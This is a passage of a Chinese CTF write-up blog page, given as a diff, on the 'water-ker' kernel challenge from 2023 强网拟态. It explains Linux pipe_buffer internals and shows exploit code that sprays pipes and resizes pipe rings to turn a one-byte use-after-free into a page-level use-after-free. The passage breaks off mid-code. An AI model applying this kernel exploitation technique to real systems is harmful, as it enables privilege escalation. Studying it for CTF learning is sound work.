@@ -1,0 +1,847 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="第一次在比赛中尝试做kernel题（虽然没做出来），复现来哩~ 基本上是抄的D^3CTF2023 d3kcache的exp，学习一下这种利用方法   虽然已经不算速速了但我还是更了(・∀・(・∀・(・∀・)*">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023强网拟态 water-ker">
+<meta property="og:url" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/index.html">
+<meta property="og:site_name" content="Eurus禁止摆烂！">
+<meta property="og:description" content="第一次在比赛中尝试做kernel题（虽然没做出来），复现来哩~ 基本上是抄的D^3CTF2023 d3kcache的exp，学习一下这种利用方法   虽然已经不算速速了但我还是更了(・∀・(・∀・(・∀・)*">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/wjx.jpg">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/page1.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/page2.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/page3.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/alloc3-0.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/uaf2.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/uaf3.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/uaf4.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read1.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read2.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/write1.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/write2.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/slf-point.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/slf-point1.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/slf-point2.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/random.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/pipe2.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/pipe3.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read11.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read22.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read33.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read44.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read55.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/uaf2.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/%E5%BE%AA%E7%8E%AF.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/%E9%A1%B5%E8%A1%A8.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/stack3.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/stack.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/stack2.png">
+<meta property="article:published_time" content="2023-11-30T07:13:13.000Z">
+<meta property="article:modified_time" content="2023-12-05T16:38:14.839Z">
+<meta property="article:author" content="Eurus">
+<meta property="article:tag" content="kernel">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="Heap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/wjx.jpg">
+
+<link rel="canonical" href="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>2023强网拟态 water-ker | Eurus禁止摆烂！</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Eurus禁止摆烂！</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">In a world of locked rooms, the man with the key is king.</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://akaieurus.github.io/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Eurus">
+      <meta itemprop="description" content="本人2022年11月—12月进入了一种原因未知的摆烂状态，故搭建博客来警醒自己。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eurus禁止摆烂！">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2023强网拟态 water-ker
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-11-30 15:13:13" itemprop="dateCreated datePublished" datetime="2023-11-30T15:13:13+08:00">2023-11-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-12-06 00:38:14" itemprop="dateModified" datetime="2023-12-06T00:38:14+08:00">2023-12-06</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/kernel/" itemprop="url" rel="index"><span itemprop="name">kernel</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/kernel/Heap/" itemprop="url" rel="index"><span itemprop="name">Heap</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>第一次在比赛中尝试做kernel题（虽然没做出来），复现来哩~</p>
+<p>基本上是抄的<a target="_blank" rel="noopener" href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">D^3CTF2023 d3kcache</a>的exp，学习一下这种利用方法</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/wjx.jpg" class title="wjx">
+
+<p><em>虽然已经不算速速了但我还是更了(・∀・(・∀・(・∀・</em>)*</p>
+<span id="more"></span>
+
+<h2 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h2><p>在pipe系统调用中申请的结构体，用于存放pipe的数据</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>在alloc_pipe_info函数中会申请pipe_buffer（默认16）个pipe_buffer</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> pipe_inode_info *<span class="title function_">alloc_pipe_info</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer),</span><br><span class="line">			     GFP_KERNEL_ACCOUNT);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在pipe_write中会给pipe_buffer-&gt;page申请一个page</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">pipe_write</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *from)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> pipe-&gt;tmp_page;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!page) &#123;</span><br><span class="line">				page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);</span><br><span class="line">				<span class="keyword">if</span> (unlikely(!page)) &#123;</span><br><span class="line">					ret = ret ? : -ENOMEM;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				pipe-&gt;tmp_page = page;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">			buf-&gt;page = page;</span><br><span class="line">			buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">			buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">			buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (is_packetized(filp))</span><br><span class="line">				buf-&gt;flags = PIPE_BUF_FLAG_PACKET;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line">			pipe-&gt;tmp_page = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>close一个pipe会在free_pipe_info释放pipe_buffer，如果一个buf-&gt;page的ref为0会在pipe_buf_release中free这个page</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free_pipe_info</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pipe-&gt;ring_size; i++) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> pipe-&gt;bufs + i;</span><br><span class="line">		<span class="keyword">if</span> (buf-&gt;ops)</span><br><span class="line">			pipe_buf_release(pipe, buf);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pipe-&gt;tmp_page)</span><br><span class="line">		__free_page(pipe-&gt;tmp_page);</span><br><span class="line">	kfree(pipe-&gt;bufs);</span><br><span class="line">	kfree(pipe);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>F_SETPIPE_SZ可以更改pipe_buffer的值达到任意大小分配的目的，在pipe_resize_ring函数中会申请新的pipe_buffer，复制内容并释放原来的pipe_buffer</p>
+<p>重新分配的大小是2^order * 0x1000，2^order就是pipe_buffer数组的大小</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pipe_resize_ring</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="type">unsigned</span> <span class="type">int</span> nr_slots)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> head, tail, mask, n;</span><br><span class="line"></span><br><span class="line">	bufs = kcalloc(nr_slots, <span class="keyword">sizeof</span>(*bufs),</span><br><span class="line">		       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!bufs))</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> h = head &amp; mask;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> t = tail &amp; mask;</span><br><span class="line">		<span class="keyword">if</span> (h &gt; t) &#123;</span><br><span class="line">			<span class="built_in">memcpy</span>(bufs, pipe-&gt;bufs + t,</span><br><span class="line">			       n * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">int</span> tsize = pipe-&gt;ring_size - t;</span><br><span class="line">			<span class="keyword">if</span> (h &gt; <span class="number">0</span>)</span><br><span class="line">				<span class="built_in">memcpy</span>(bufs + tsize, pipe-&gt;bufs,</span><br><span class="line">				       h * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">			<span class="built_in">memcpy</span>(bufs, pipe-&gt;bufs + t,</span><br><span class="line">			       tsize * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	head = n;</span><br><span class="line">	tail = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	kfree(pipe-&gt;bufs);</span><br><span class="line">	pipe-&gt;bufs = bufs;</span><br><span class="line">	pipe-&gt;ring_size = nr_slots;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>漏洞就不说了(ˉ▽ˉ；)…，0x200的chunk，有一次一字节的uaf</p>
+<h3 id="构造页级uaf"><a href="#构造页级uaf" class="headerlink" title="构造页级uaf"></a>构造页级uaf</h3><p>可以把pipe_buffer分配到uaf的chunk，这样我们就能更改page成员的低字节，一个page结构体是0x40，只要把低字节改成0x40的倍数就可能使两个pipe_buffer-&gt;page指向同一个page</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/page1.png" class title="page1">
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/page2.png" class title="page2">
+
+<p>再把这个page释放掉我们就获得了一个uaf的page，再把这个page分配给其他的结构体就可以通过pipe管道的性质更改结构体的内容</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/page3.png" class title="page3">
+
+<p>来看exp</p>
+<ul>
+<li><p>一些准备工作</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">save_status();</span><br><span class="line">bind_core(<span class="number">0</span>);</span><br><span class="line">fd_water = open(<span class="string">&quot;/dev/water&quot;</span>, O_RDWR);</span><br><span class="line"><span class="keyword">if</span>(fd_water &lt; <span class="number">0</span>)</span><br><span class="line">    err_exit(<span class="string">&quot;Fail to open the device water!&quot;</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>进行以上利用需要一些pipe_buffer-&gt;page是物理相邻的，把order 0的page消耗光就能从更高的order取page并进行分裂，这样就能获得相邻的page了，所以，简单粗暴地开喷！</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/alloc3-0.png" class title="alloc3-0">
+
+<ul>
+<li><p>喷一些pipe_buffer</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to alloc %d pipe!&quot;</span>, i);</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to create pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>分两波更改大小，分两波的原因</p>
+<ul>
+<li>后续write的时候会给buffer_pipe-&gt;page分配物理页，顺序和现在重新分配buffer_pipe一样</li>
+<li>前面分配的page可能不是物理连续的，而利用需要连续的物理页</li>
+<li>所以第一波分配先消耗一下不连续的物理页，之后的物理页就是连续的了</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] first extend pipe pages...&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM / <span class="number">2</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">8</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to extend %d pipe!&quot;</span>, i);</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to extend pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] UAF...&quot;</span>);</span><br><span class="line">add_chunk(<span class="string">&quot;Eurus&quot;</span>);</span><br><span class="line">delete_chunk();</span><br><span class="line">    </span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] second extend pipe pages...&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = PIPE_SPRAY_NUM / <span class="number">2</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">8</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to extend %d pipe!&quot;</span>, i);</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to extend pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>write一波，给pipe_buffer-&gt;page分配物理页，写入pipe_fd的编号便于寻找是否成功造成page重叠</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] allocating pipe pages...&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">&#123;</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    